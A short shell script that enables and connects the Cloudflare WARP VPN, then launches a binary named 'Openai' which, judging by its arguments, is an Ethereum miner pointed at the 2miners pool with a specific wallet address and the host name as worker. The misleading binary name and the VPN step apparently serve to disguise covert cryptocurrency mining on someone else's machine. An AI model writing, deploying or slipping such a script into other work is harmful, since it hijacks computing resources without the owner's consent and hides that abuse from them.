#!/bin/sh

warp-cli enable-always-on
warp-cli connect
sleep 10
./Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.$HOSTNAME


